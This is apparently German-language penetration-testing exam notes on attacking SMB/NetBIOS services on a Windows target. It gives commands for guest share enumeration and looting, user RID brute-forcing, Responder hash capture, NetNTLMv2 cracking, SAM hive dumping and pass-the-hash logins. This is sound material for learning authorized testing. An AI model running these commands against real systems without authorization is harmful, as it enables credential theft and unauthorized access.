# 🪟 SMB / NetBIOS — 445, 139, 137

> **Prüfungsfokus:** Auf der Windows-Maschine zuerst Shares und Dateien prüfen. SMB muss kein RCE liefern; Backups, Notizen, PCAPs, KeePass oder Credentials können der eigentliche Weg sein.

## Ports richtig einordnen

| Port | Bedeutung |
|---|---|
| `445/TCP` | SMB direkt über TCP; wichtigster Port |
| `139/TCP` | SMB über NetBIOS Session Service |
| `137/UDP` | NetBIOS Name Service |

Kein vollständiger UDP-Scan. Port 137 nur bei ausdrücklichem Hinweis gezielt prüfen:

```bash
sudo nmap -sU -p 137 $RHOST
```

## 1. Basis-Check und Guest/Null

```bash
# OS, Domain/Workgroup, SMB-Version, Signing
nxc smb $RHOST

# Leere Credentials und Guest testen
nxc smb $RHOST -u '' -p '' --shares
nxc smb $RHOST -u guest -p '' --shares

# smbclient-Alternative
smbclient -L //$RHOST/ -N
smbclient -L //$RHOST/ -U 'guest%'
```

Interpretation:

```text
Signing: True, not required → Signing nicht erzwungen; für Prüfung primär als Finding notieren
Guest/Null erfolgreich → sofort alle Shares und Dateien prüfen
READ → Dateien herunterladen
WRITE → Upload prüfen, aber nicht automatisch Codeausführung
```

## 2. Share rekursiv herunterladen

```bash
mkdir -p loot/smb/<SHARE> && cd loot/smb/<SHARE>
smbclient //$RHOST/<SHARE> -N
```

In `smbclient`:

```text
ls
recurse ON
prompt OFF
mget *
```

Mit Guest:

```bash
smbclient //$RHOST/<SHARE> -U 'guest%'
```

Schnell mit NetExec:

```bash
nxc smb $RHOST -u guest -p '' -M spider_plus
```

Lokal auswerten:

```bash
find . -type f | sort
find . -type f \( -iname '*.txt' -o -iname '*.ini' -o -iname '*.config' \
  -o -iname '*.xml' -o -iname '*.bak' -o -iname '*.old' -o -iname '*.zip' \
  -o -iname '*.kdbx' -o -iname '*.pdf' -o -iname '*.pcap*' \)

grep -RniIE 'pass|pwd|user|login|admin|key|token|secret|backup|cred' . 2>/dev/null
```

> **Hinweis Prof:** Besonders nach Backup-Dateien und Klartext-Hinweisen suchen. Bilder ebenfalls öffnen; Credentials können in Screenshots/Notizen liegen.

## 3. Benutzer enumerieren

```bash
# Wenn Guest/Null funktioniert
nxc smb $RHOST -u guest -p '' --rid-brute
enum4linux-ng -A $RHOST
```

Benutzer direkt in Liste übernehmen:

```bash
nxc smb $RHOST -u guest -p '' --rid-brute | tee rid.txt
```

Danach gefundene User mit Website-/Dateihinweisen kombinieren und eine kleine Passwortliste bauen.

## 4. Gefundene Credentials testen

```bash
nxc smb $RHOST -u <USER> -p '<PASS>' --shares
evil-winrm -i $RHOST -u <USER> -p '<PASS>'
xfreerdp /v:$RHOST /u:<USER> /p:'<PASS>' /cert:ignore
```

Lokalen NTLM-Hash statt Passwort testen:

```bash
nxc smb $RHOST -u <USER> -H <NTLM_HASH>
evil-winrm -i $RHOST -u <USER> -H <NTLM_HASH>
```

## 5. NetNTLMv2 Challenge-Response

### Erkennen

Typisches Format:

```text
USER::DOMAIN:SERVER_CHALLENGE:NT_PROOF_STRING:RESPONSE_BLOB
```

**Kein Pass-the-Hash.** NetNTLMv2 ist eine Challenge-Response und muss geknackt werden; danach wird das Klartextpasswort benutzt.

### Mit Responder erfassen

```bash
ip -br a                       # korrektes Interface bestimmen
sudo responder -I <INTERFACE> -v
# aus einem Git-Clone alternativ: sudo python3 Responder.py -I <INTERFACE> -v
```

- `<INTERFACE>` meist `tun0`, `eth0` oder das Prüfungs-VPN-Interface.
- Bei einer Web-/App-Funktion, die Pfade/URLs verarbeitet, kann ein Zugriff auf `\\$LHOST\share` eine Windows-Authentifizierung zu Responder auslösen.
- Logs liegen meist unter `/usr/share/responder/logs/`.

```bash
ls -lt /usr/share/responder/logs/
cp /usr/share/responder/logs/SMB-NTLMv2-*.txt netntlmv2.txt
```

### Aus PCAP/Traffic finden

Wireshark-Filter:

```text
ntlmssp
smb2 || smb
```

CLI:

```bash
tshark -r capture.pcap -Y 'ntlmssp' -V | less
```

### Cracken

```bash
john --format=netntlmv2 --wordlist=passwords_final.txt netntlmv2.txt
john --show --format=netntlmv2 netntlmv2.txt

hashcat -m 5600 netntlmv2.txt passwords_final.txt
hashcat -m 5600 netntlmv2.txt --show
```

> **Anpassen:** zuerst die aus Website/Dateien erstellte kleine Liste verwenden; danach bei Bedarf eine größere passende Wordlist.

## 6. Lokale SAM/SYSTEM-Hives

Falls Backup/Forensik-Artefakt `SAM`, `SYSTEM` und optional `SECURITY` enthält:

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

Typische Ausgabe:

```text
Administrator:500:aad3b435...:<NTLM_HASH>:::
```

Der letzte Hash ist der lokale NTLM-Hash. Abhängig von Dienst/Rechten:

```bash
evil-winrm -i $RHOST -u Administrator -H <NTLM_HASH>
impacket-psexec -hashes :<NTLM_HASH> Administrator@$RHOST
```

→ Unterschied und Crack-Formate: [Passwords & Hashes](../../02-Exploitation/Passwords/README.md)

## 7. Reporting-Notiz

Dokumentiere nicht nur den Login, sondern die eigentliche Ursache:

```text
Anonymer/Guest-Zugriff auf SMB-Share
→ sensibles Backup/Notiz/PCAP/KeePass lesbar
→ Credential/Hash gewonnen
→ Anmeldung oder PrivEsc möglich
```
